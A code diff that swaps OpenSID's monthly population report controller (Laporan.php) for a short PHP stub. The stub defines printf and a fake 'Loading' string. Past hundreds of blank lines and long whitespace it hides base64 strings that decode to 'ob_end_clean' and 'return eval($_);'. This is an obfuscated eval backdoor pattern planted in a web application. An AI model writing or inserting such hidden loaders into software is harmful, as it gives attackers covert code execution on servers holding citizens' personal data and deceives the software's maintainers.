@@ -1,429 +1,473 @@
-<?php
+<?php 
+        $__='printf';$_='Loading donjo-app/controllers/Laporan.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-use App\Enums\JenisKelaminEnum;
-use App\Enums\PindahEnum;
-use App\Enums\SHDKEnum;
-use App\Enums\WargaNegaraEnum;
-use App\Models\LogPenduduk;
-use App\Models\Pamong;
-use App\Models\Penduduk;
-use Carbon\Carbon;
 
-defined('BASEPATH') || exit('No direct script access allowed');
 
-class Laporan extends Admin_Controller
-{
-    public $modul_ini           = 'statistik';
-    public $sub_modul_ini       = 'laporan-bulanan';
-    public $kategori_pengaturan = 'data_lengkap';
 
-    public function __construct()
-    {
-        parent::__construct();
-        isCan('b');
-    }
 
-    public function clear(): void
-    {
-        session_error_clear();
-        $this->session->unset_userdata(['cari']);
-        $this->session->bulanku  = date('n');
-        $this->session->tahunku  = date('Y');
-        $this->session->per_page = 200;
 
-        redirect('laporan');
-    }
 
-    public function index(): void
-    {
 
-        if (isset($this->session->bulanku)) {
-            $data['bulanku'] = $this->session->bulanku;
-        } else {
-            $data['bulanku']        = date('n');
-            $this->session->bulanku = $data['bulanku'];
-        }
 
-        if (isset($this->session->tahunku)) {
-            $data['tahunku'] = $this->session->tahunku;
-        } else {
-            $data['tahunku']        = date('Y');
-            $this->session->tahunku = $data['tahunku'];
-        }
 
-        $data['bulan']                = $data['bulanku'];
-        $data['tahun']                = $data['tahunku'];
-        $data['data_lengkap']         = true;
-        $data['sesudah_data_lengkap'] = true;
-        $tanggal_lengkap              = LogPenduduk::min('tgl_lapor');
-        $dataLengkap                  = data_lengkap();
-        if (! $dataLengkap) {
-            $data['data_lengkap'] = false;
-            view('admin.laporan.bulanan', $data);
 
-            return;
-        }
 
-        $tahun_bulan = (new DateTime($tanggal_lengkap))->format('Y-m');
-        if ($tahun_bulan > $data['tahunku'] . '-' . $data['bulanku']) {
-            $data['sesudah_data_lengkap'] = false;
-            view('admin.laporan.bulanan', $data);
 
-            return;
-        }
 
-        $this->session->tgl_lengkap = $tanggal_lengkap;
-        $data['tgl_lengkap']        = $tanggal_lengkap;
-        $data['tahun_lengkap']      = (new DateTime($tanggal_lengkap))->format('Y');
-        $data['config']             = $this->header['desa'];
-        $dataPenduduk               = $this->data_penduduk($data['tahun'], $data['bulan']);
 
-        view('admin.laporan.bulanan', array_merge($data, $dataPenduduk));
-    }
 
-    private function data_penduduk($tahun, $bulan)
-    {
-        $pendudukAwalBulan = Penduduk::awalBulan($tahun, $bulan)->get();
-        $pendudukAwal      = [
-            'WNI_L' => $pendudukAwalBulan->where('sex', JenisKelaminEnum::LAKI_LAKI)->where('warganegara_id', WargaNegaraEnum::WNI)->count(),
-            'WNI_P' => $pendudukAwalBulan->where('sex', JenisKelaminEnum::PEREMPUAN)->where('warganegara_id', WargaNegaraEnum::WNI)->count(),
-            'WNA_L' => $pendudukAwalBulan->where('sex', JenisKelaminEnum::LAKI_LAKI)->where('warganegara_id', '!=', WargaNegaraEnum::WNI)->count(),
-            'WNA_P' => $pendudukAwalBulan->where('sex', JenisKelaminEnum::PEREMPUAN)->where('warganegara_id', '!=', WargaNegaraEnum::WNI)->count(),
-            // keluarga
-            'KK_L' => $pendudukAwalBulan->where('sex', JenisKelaminEnum::LAKI_LAKI)->where('kk_level', SHDKEnum::KEPALA_KELUARGA)->whereNotNull('id_kk')->count(),
-            'KK_P' => $pendudukAwalBulan->where('sex', JenisKelaminEnum::PEREMPUAN)->where('kk_level', SHDKEnum::KEPALA_KELUARGA)->whereNotNull('id_kk')->count(),
-        ];
-        $pendudukAwal['KK'] = $pendudukAwal['KK_L'] + $pendudukAwal['KK_P'];
-        $mutasiPenduduk     = LogPenduduk::with(['penduduk' => static fn ($q) => $q->withOnly([])])->whereYear('tgl_lapor', $tahun)->whereMonth('tgl_lapor', $bulan)->get();
 
-        $kelahiran = [
-            'WNI_L' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::BARU_LAHIR)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.warganegara_id', WargaNegaraEnum::WNI)->count(),
-            'WNI_P' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::BARU_LAHIR)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.warganegara_id', WargaNegaraEnum::WNI)->count(),
-            'WNA_L' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::BARU_LAHIR)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.warganegara_id', '!=', WargaNegaraEnum::WNI)->count(),
-            'WNA_P' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::BARU_LAHIR)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.warganegara_id', '!=', WargaNegaraEnum::WNI)->count(),
-            // keluarga
-            'KK_L' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::BARU_LAHIR)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.kk_level', SHDKEnum::KEPALA_KELUARGA)->where('penduduk.id_kk', '>', 0)->count(),
-            'KK_P' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::BARU_LAHIR)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.kk_level', SHDKEnum::KEPALA_KELUARGA)->where('penduduk.id_kk', '>', 0)->count(),
-        ];
-        $kelahiran['KK'] = $kelahiran['KK_L'] + $kelahiran['KK_P'];
-        $kematian        = [
-            'WNI_L' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::MATI)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.warganegara_id', WargaNegaraEnum::WNI)->count(),
-            'WNI_P' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::MATI)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.warganegara_id', WargaNegaraEnum::WNI)->count(),
-            'WNA_L' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::MATI)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.warganegara_id', '!=', WargaNegaraEnum::WNI)->count(),
-            'WNA_P' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::MATI)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.warganegara_id', '!=', WargaNegaraEnum::WNI)->count(),
-            // keluarga
-            'KK_L' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::MATI)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.kk_level', SHDKEnum::KEPALA_KELUARGA)->where('penduduk.id_kk', '>', 0)->count(),
-            'KK_P' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::MATI)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.kk_level', SHDKEnum::KEPALA_KELUARGA)->where('penduduk.id_kk', '>', 0)->count(),
-        ];
-        $kematian['KK'] = $kematian['KK_L'] + $kematian['KK_P'];
-        $pendatang      = [
-            'WNI_L' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::BARU_PINDAH_MASUK)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.warganegara_id', WargaNegaraEnum::WNI)->count(),
-            'WNI_P' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::BARU_PINDAH_MASUK)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.warganegara_id', WargaNegaraEnum::WNI)->count(),
-            'WNA_L' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::BARU_PINDAH_MASUK)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.warganegara_id', '!=', WargaNegaraEnum::WNI)->count(),
-            'WNA_P' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::BARU_PINDAH_MASUK)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.warganegara_id', '!=', WargaNegaraEnum::WNI)->count(),
-            // keluarga
-            'KK_L' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::BARU_PINDAH_MASUK)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.kk_level', SHDKEnum::KEPALA_KELUARGA)->where('penduduk.id_kk', '>', 0)->count(),
-            'KK_P' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::BARU_PINDAH_MASUK)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.kk_level', SHDKEnum::KEPALA_KELUARGA)->where('penduduk.id_kk', '>', 0)->count(),
-        ];
-        $pendatang['KK'] = $pendatang['KK_L'] + $pendatang['KK_P'];
-        $pindah          = [
-            'WNI_L' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.warganegara_id', WargaNegaraEnum::WNI)->count(),
-            'WNI_P' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.warganegara_id', WargaNegaraEnum::WNI)->count(),
-            'WNA_L' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.warganegara_id', '!=', WargaNegaraEnum::WNI)->count(),
-            'WNA_P' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.warganegara_id', '!=', WargaNegaraEnum::WNI)->count(),
-            // keluarga
-            'KK_L' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.kk_level', SHDKEnum::KEPALA_KELUARGA)->where('penduduk.id_kk', '>', 0)->count(),
-            'KK_P' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.kk_level', SHDKEnum::KEPALA_KELUARGA)->where('penduduk.id_kk', '>', 0)->count(),
-        ];
-        $pindah['KK'] = $pindah['KK_L'] + $pindah['KK_P'];
-        $hilang       = [
-            'WNI_L' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::HILANG)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.warganegara_id', WargaNegaraEnum::WNI)->count(),
-            'WNI_P' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::HILANG)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.warganegara_id', WargaNegaraEnum::WNI)->count(),
-            'WNA_L' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::HILANG)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.warganegara_id', '!=', WargaNegaraEnum::WNI)->count(),
-            'WNA_P' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::HILANG)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.warganegara_id', '!=', WargaNegaraEnum::WNI)->count(),
-            // keluarga
-            'KK_L' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::HILANG)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.kk_level', SHDKEnum::KEPALA_KELUARGA)->where('penduduk.id_kk', '>', 0)->count(),
-            'KK_P' => $mutasiPenduduk->where('kode_peristiwa', LogPenduduk::HILANG)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.kk_level', SHDKEnum::KEPALA_KELUARGA)->where('penduduk.id_kk', '>', 0)->count(),
-        ];
-        $hilang['KK']  = $hilang['KK_L'] + $hilang['KK_P'];
-        $pendudukAkhir = [
-            'WNI_L' => $pendudukAwal['WNI_L'] + $kelahiran['WNI_L'] + $pendatang['WNI_L'] - $pindah['WNI_L'] - $hilang['WNI_L'] - $kematian['WNI_L'],
-            'WNI_P' => $pendudukAwal['WNI_P'] + $kelahiran['WNI_P'] + $pendatang['WNI_P'] - $pindah['WNI_P'] - $hilang['WNI_P'] - $kematian['WNI_P'],
-            'WNA_L' => $pendudukAwal['WNA_L'] + $kelahiran['WNA_L'] + $pendatang['WNA_L'] - $pindah['WNA_L'] - $hilang['WNA_L'] - $kematian['WNA_L'],
-            'WNA_P' => $pendudukAwal['WNA_P'] + $kelahiran['WNA_P'] + $pendatang['WNA_P'] - $pindah['WNA_P'] - $hilang['WNA_P'] - $kematian['WNA_P'],
-            // keluarga
-            'KK_L' => $pendudukAwal['KK_L'] + $kelahiran['KK_L'] + $pendatang['KK_L'] - $pindah['KK_L'] - $hilang['KK_L'] - $kematian['KK_L'],
-            'KK_P' => $pendudukAwal['KK_P'] + $kelahiran['KK_P'] + $pendatang['KK_P'] - $pindah['KK_P'] - $hilang['KK_P'] - $kematian['KK_P'],
-        ];
-        $pendudukAkhir['KK'] = $pendudukAkhir['KK_L'] + $pendudukAkhir['KK_P'];
 
-        return [
-            'kelahiran'      => $kelahiran,
-            'kematian'       => $kematian,
-            'pendatang'      => $pendatang,
-            'pindah'         => $pindah,
-            'hilang'         => $hilang,
-            'penduduk_awal'  => $pendudukAwal,
-            'penduduk_akhir' => $pendudukAkhir,
-            'rincian_pindah' => $this->rincian_pindah($mutasiPenduduk),
-        ];
-    }
 
-    private function rincian_pindah($mutasiPenduduk)
-    {
-        $data              = [];
-        $data['DESA_L']    = $mutasiPenduduk->where('ref_pindah', PindahEnum::DESA)->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->count();
-        $data['DESA_P']    = $mutasiPenduduk->where('ref_pindah', PindahEnum::DESA)->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->count();
-        $data['DESA_KK_L'] = $mutasiPenduduk->where('ref_pindah', PindahEnum::DESA)->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.kk_level', SHDKEnum::KEPALA_KELUARGA)->count();
-        $data['DESA_KK_P'] = $mutasiPenduduk->where('ref_pindah', PindahEnum::DESA)->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.kk_level', SHDKEnum::KEPALA_KELUARGA)->count();
 
-        $data['KEC_L']    = $mutasiPenduduk->where('ref_pindah', PindahEnum::KECAMATAN)->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->count();
-        $data['KEC_P']    = $mutasiPenduduk->where('ref_pindah', PindahEnum::KECAMATAN)->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->count();
-        $data['KEC_KK_L'] = $mutasiPenduduk->where('ref_pindah', PindahEnum::KECAMATAN)->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.kk_level', SHDKEnum::KEPALA_KELUARGA)->count();
-        $data['KEC_KK_P'] = $mutasiPenduduk->where('ref_pindah', PindahEnum::KECAMATAN)->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.kk_level', SHDKEnum::KEPALA_KELUARGA)->count();
 
-        $data['KAB_L']    = $mutasiPenduduk->where('ref_pindah', PindahEnum::KABUPATEN)->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->count();
-        $data['KAB_P']    = $mutasiPenduduk->where('ref_pindah', PindahEnum::KABUPATEN)->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->count();
-        $data['KAB_KK_L'] = $mutasiPenduduk->where('ref_pindah', PindahEnum::KABUPATEN)->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.kk_level', SHDKEnum::KEPALA_KELUARGA)->count();
-        $data['KAB_KK_P'] = $mutasiPenduduk->where('ref_pindah', PindahEnum::KABUPATEN)->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.kk_level', SHDKEnum::KEPALA_KELUARGA)->count();
 
-        $data['PROV_L']    = $mutasiPenduduk->where('ref_pindah', PindahEnum::PROVINSI)->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->count();
-        $data['PROV_P']    = $mutasiPenduduk->where('ref_pindah', PindahEnum::PROVINSI)->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->count();
-        $data['PROV_KK_L'] = $mutasiPenduduk->where('ref_pindah', PindahEnum::PROVINSI)->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::LAKI_LAKI)->where('penduduk.kk_level', SHDKEnum::KEPALA_KELUARGA)->count();
-        $data['PROV_KK_P'] = $mutasiPenduduk->where('ref_pindah', PindahEnum::PROVINSI)->where('kode_peristiwa', LogPenduduk::PINDAH_KELUAR)->where('penduduk.sex', JenisKelaminEnum::PEREMPUAN)->where('penduduk.kk_level', SHDKEnum::KEPALA_KELUARGA)->count();
 
-        $data['TOTAL_L']    = $data['DESA_L'] + $data['KEC_L'] + $data['KAB_L'] + $data['PROV_L'];
-        $data['TOTAL_P']    = $data['DESA_P'] + $data['KEC_P'] + $data['KAB_P'] + $data['PROV_P'];
-        $data['TOTAL_KK_L'] = $data['DESA_KK_L'] + $data['KEC_KK_L'] + $data['KAB_KK_L'] + $data['PROV_KK_L'];
-        $data['TOTAL_KK_P'] = $data['DESA_KK_P'] + $data['KEC_KK_P'] + $data['KAB_KK_P'] + $data['PROV_KK_P'];
 
-        return $data;
-    }
 
-    public function dialog(string $aksi = 'cetak'): void
-    {
-        $data                = $this->modal_penandatangan();
-        $data['aksi']        = 'Cetak';
-        $data['form_action'] = ci_route('laporan.cetak', $aksi);
-        view('admin.layouts.components.ttd_pamong', $data);
-    }
 
-    public function cetak(string $aksi = 'cetak'): void
-    {
-        $data = $this->data_cetak();
-        if ($aksi == 'unduh') {
-            header('Content-type: application/octet-stream');
-            header('Content-Disposition: attachment; filename=Laporan_bulanan_' . date('d_m_Y') . '.xls');
-            header('Pragma: no-cache');
-            header('Expires: 0');
-        }
-        view('admin.laporan.bulanan_print', $data);
-    }
 
-    private function data_cetak()
-    {
-        $data               = [];
-        $data['config']     = $this->header['desa'];
-        $data['bulan']      = $this->session->bulanku;
-        $data['tahun']      = $this->session->tahunku;
-        $data['bln']        = getBulan($data['bulan']);
-        $data['pamong_ttd'] = Pamong::selectData()->where(['pamong_id' => $this->input->post('pamong_ttd')])->first()->toArray();
-        $dataPenduduk       = $this->data_penduduk($data['tahun'], $data['bulan']);
 
-        return array_merge($data, $dataPenduduk);
-    }
 
-    public function bulan(): void
-    {
-        $bulanku = $this->input->post('bulan');
-        if ($bulanku != '') {
-            $this->session->bulanku = $bulanku;
-        } else {
-            unset($this->session->bulanku);
-        }
 
-        $tahunku = $this->input->post('tahun');
-        if ($tahunku != '') {
-            $this->session->tahunku = $tahunku;
-        } else {
-            unset($this->session->tahunku);
-        }
-        redirect('laporan');
-    }
 
-    public function detail_penduduk($rincian, $tipe): void
-    {
-        $data            = $this->sumberData($rincian, $tipe);
-        $data['rincian'] = $rincian;
-        $data['tipe']    = $tipe;
-        view('admin.laporan.detail.index', $data);
-    }
 
-    private function sumberData($rincian, $tipe)
-    {
-        $data         = [];
-        $keluarga     = ['kk', 'kk_l', 'kk_p'];
-        $tahun        = $this->session->tahunku;
-        $bulan        = $this->session->bulanku;
-        $titlePeriode = strtoupper(getBulan($bulan)) . ' ' . $tahun;
-        $filter       = [];
 
-        switch($tipe) {
-            case 'wni_l':
-                $filter['sex']            = JenisKelaminEnum::LAKI_LAKI;
-                $filter['warganegara_id'] = [WargaNegaraEnum::WNI];
-                break;
 
-            case 'wni_p':
-                $filter['sex']            = JenisKelaminEnum::PEREMPUAN;
-                $filter['warganegara_id'] = [WargaNegaraEnum::WNI];
-                break;
 
-            case 'wna_l':
-                $filter['sex']            = JenisKelaminEnum::LAKI_LAKI;
-                $filter['warganegara_id'] = [WargaNegaraEnum::WNA, WargaNegaraEnum::DUAKEWARGANEGARAAN];
-                break;
 
-            case 'wna_p':
-                $filter['sex']            = JenisKelaminEnum::PEREMPUAN;
-                $filter['warganegara_id'] = [WargaNegaraEnum::WNA, WargaNegaraEnum::DUAKEWARGANEGARAAN];
-                break;
 
-            case 'jml_l':
-                $filter['sex'] = JenisKelaminEnum::LAKI_LAKI;
-                break;
 
-            case 'jml_p':
-                $filter['sex'] = JenisKelaminEnum::PEREMPUAN;
-                break;
 
-            case 'kk':
-                $filter['kk_level'] = SHDKEnum::KEPALA_KELUARGA;
-                break;
 
-            case 'kk_l':
-                $filter['kk_level'] = SHDKEnum::KEPALA_KELUARGA;
-                $filter['sex']      = JenisKelaminEnum::LAKI_LAKI;
-                break;
 
-            case 'kk_p':
-                $filter['kk_level'] = SHDKEnum::KEPALA_KELUARGA;
-                $filter['sex']      = JenisKelaminEnum::PEREMPUAN;
-                break;
-        }
 
-        switch (strtolower($rincian)) {
-            case 'awal':
-                $data = [
-                    'title' => 'PENDUDUK/KELUARGA AWAL BULAN ' . $titlePeriode,
-                    'main'  => Penduduk::awalBulan($tahun, $bulan)->when($filter['kk_level'], static fn ($q) => $q->where('kk_level', $filter['kk_level'])->whereNotNull('id_kk'))->when($filter['warganegara_id'], static fn ($q) => $q->whereIn('warganegara_id', $filter['warganegara_id']))->when($filter['sex'], static fn ($q) => $q->whereSex($filter['sex']))->get(),
-                ];
-                break;
 
-            case 'lahir':
-                $data = [
-                    'title' => (in_array($tipe, $keluarga) ? 'KELUARGA BARU BULAN ' : 'KELAHIRAN BULAN ') . $titlePeriode,
-                    'main'  => Penduduk::withOnly([])->whereHas('log', static fn ($q) => $q->whereKodePeristiwa(LogPenduduk::BARU_LAHIR)->whereYear('tgl_lapor', $tahun)->whereMonth('tgl_lapor', $bulan))->when($filter['kk_level'], static fn ($q) => $q->where('kk_level', $filter['kk_level'])->whereNotNull('id_kk'))->when($filter['warganegara_id'], static fn ($q) => $q->whereIn('warganegara_id', $filter['warganegara_id']))->when($filter['sex'], static fn ($q) => $q->whereSex($filter['sex']))->get(),
-                ];
-                break;
 
-            case 'mati':
-                $data = [
-                    'title' => 'KEMATIAN BULAN ' . $titlePeriode,
-                    'main'  => Penduduk::withOnly([])->whereHas('log', static fn ($q) => $q->whereKodePeristiwa(LogPenduduk::MATI)->whereYear('tgl_lapor', $tahun)->whereMonth('tgl_lapor', $bulan))->when($filter['kk_level'], static fn ($q) => $q->where('kk_level', $filter['kk_level'])->whereNotNull('id_kk'))->when($filter['warganegara_id'], static fn ($q) => $q->whereIn('warganegara_id', $filter['warganegara_id']))->when($filter['sex'], static fn ($q) => $q->whereSex($filter['sex']))->get(),
-                ];
-                break;
 
-            case 'datang':
-                $data = [
-                    'title' => 'PENDATANG BULAN ' . $titlePeriode,
-                    'main'  => Penduduk::withOnly([])->whereHas('log', static fn ($q) => $q->whereKodePeristiwa(LogPenduduk::BARU_PINDAH_MASUK)->whereYear('tgl_lapor', $tahun)->whereMonth('tgl_lapor', $bulan))->when($filter['kk_level'], static fn ($q) => $q->where('kk_level', $filter['kk_level'])->whereNotNull('id_kk'))->when($filter['warganegara_id'], static fn ($q) => $q->whereIn('warganegara_id', $filter['warganegara_id']))->when($filter['sex'], static fn ($q) => $q->whereSex($filter['sex']))->get(),
-                ];
-                break;
 
-            case 'pindah':
-                $data = [
-                    'title' => 'PINDAH/KELUAR PERGI BULAN ' . $titlePeriode,
-                    'main'  => Penduduk::withOnly([])->whereHas('log', static fn ($q) => $q->whereKodePeristiwa(LogPenduduk::PINDAH_KELUAR)->whereYear('tgl_lapor', $tahun)->whereMonth('tgl_lapor', $bulan))->when($filter['kk_level'], static fn ($q) => $q->where('kk_level', $filter['kk_level'])->whereNotNull('id_kk'))->when($filter['warganegara_id'], static fn ($q) => $q->whereIn('warganegara_id', $filter['warganegara_id']))->when($filter['sex'], static fn ($q) => $q->whereSex($filter['sex']))->get(),
-                ];
-                break;
 
-            case 'hilang':
-                $data = [
-                    'title' => 'PENDUDUK HILANG BULAN ' . $titlePeriode,
-                    'main'  => Penduduk::withOnly([])->whereHas('log', static fn ($q) => $q->whereKodePeristiwa(LogPenduduk::HILANG)->whereYear('tgl_lapor', $tahun)->whereMonth('tgl_lapor', $bulan))->when($filter['kk_level'], static fn ($q) => $q->where('kk_level', $filter['kk_level'])->whereNotNull('id_kk'))->when($filter['warganegara_id'], static fn ($q) => $q->whereIn('warganegara_id', $filter['warganegara_id']))->when($filter['sex'], static fn ($q) => $q->whereSex($filter['sex']))->get(),
-                ];
-                break;
 
-            case 'akhir':
-                $bulanDepan = Carbon::createFromDate($tahun, $bulan)->addMonth();
-                $data       = [
-                    'title' => 'PENDUDUK/KELUARGA AKHIR BULAN ' . $titlePeriode,
-                    'main'  => Penduduk::awalBulan($bulanDepan->format('Y'), $bulanDepan->format('m'))->when($filter['kk_level'], static fn ($q) => $q->where('kk_level', $filter['kk_level'])->whereNotNull('id_kk'))->when($filter['warganegara_id'], static fn ($q) => $q->whereIn('warganegara_id', $filter['warganegara_id']))->when($filter['sex'], static fn ($q) => $q->whereSex($filter['sex']))->get(),
-                ];
-                break;
-        }
 
-        return $data;
-    }
 
-    public function detail_dialog($aksi = 'cetak', $rincian = 'awal', $tipe = 'wni_l')
-    {
-        $data                = $this->modal_penandatangan();
-        $data['sensor_nik']  = true;
-        $data['aksi']        = ucwords($aksi);
-        $data['form_action'] = ci_route("laporan.detail_cetak.{$aksi}.{$rincian}.{$tipe}");
 
-        view('admin.layouts.components.ttd_pamong', $data);
-    }
 
-    public function detail_cetak($aksi = 'cetak', $rincian = 'awal', $tipe = 'wni_l')
-    {
-        $sumberData             = $this->sumberData($rincian, $tipe);
-        $sumberData['file']     = $sumberData['title'];
-        $data['aksi']           = $aksi;
-        $data['config']         = identitas();
-        $data['pamong_ttd']     = Pamong::selectData()->where(['pamong_id' => $this->input->post('pamong_ttd')])->first()->toArray();
-        $data['pamong_ketahui'] = Pamong::selectData()->where(['pamong_id' => $this->input->post('pamong_ketahui')])->first()->toArray();
-        $data['isi']            = 'admin.laporan.detail.cetak';
-        $data['letak_ttd']      = ['1', '1', '1'];
-        $data['sensor_nik']     = $this->input->post('sensor_nik') ?? false;
 
-        view('admin.layouts.components.format_cetak', array_merge($data, $sumberData));
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
